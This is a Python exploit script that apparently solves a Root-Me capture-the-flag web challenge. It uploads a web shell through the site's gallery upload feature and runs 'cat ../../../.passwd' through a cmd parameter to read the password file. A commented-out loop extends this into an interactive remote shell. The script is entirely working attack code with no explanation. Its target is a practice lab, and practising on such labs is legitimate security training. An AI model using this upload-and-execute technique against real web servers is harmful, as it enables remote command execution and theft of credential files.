
import re
import sys
import requests

URL_ROOT = "http://challenge01.root-me.org/web-serveur/ch20"
QUERY_UPLOAD = "/?action=upload" 
UPLOAD_DIR = "/galerie/upload/"
COMMAND_QUERY = "?cmd="

shell = sys.argv[1]

files = { "file": open(shell, "rb") }

session = requests.Session()

# Upload file
response = session.post(URL_ROOT + QUERY_UPLOAD, files=files).text

# Find folder name
foldername = re.search(r"\/upload\/([\w]+)\/", response).groups()[0]

flag_raw = session.get(f"{URL_ROOT}{UPLOAD_DIR}{foldername}//{shell}{COMMAND_QUERY}cat ../../../.passwd").text

flag = re.search(r"<pre>(.+)", flag_raw).groups()[0]

print(flag)


# Execute commands

#final = False

#while not final:
#	current_directory = re.search(r"<pre>(.+)\n<\/pre>", session.get(f"{URL_ROOT}{UPLOAD_DIR}{string}//{shell}{COMMAND_QUERY}pwd").text).groups()[0]
#	command = input(f"panic@shell:{current_directory}# ")
#	if command == "exit":
#		final = True
#	else:
#		response = session.get(f"{URL_ROOT}{UPLOAD_DIR}{string}//{shell}{COMMAND_QUERY}{command}").text
#		print(response)
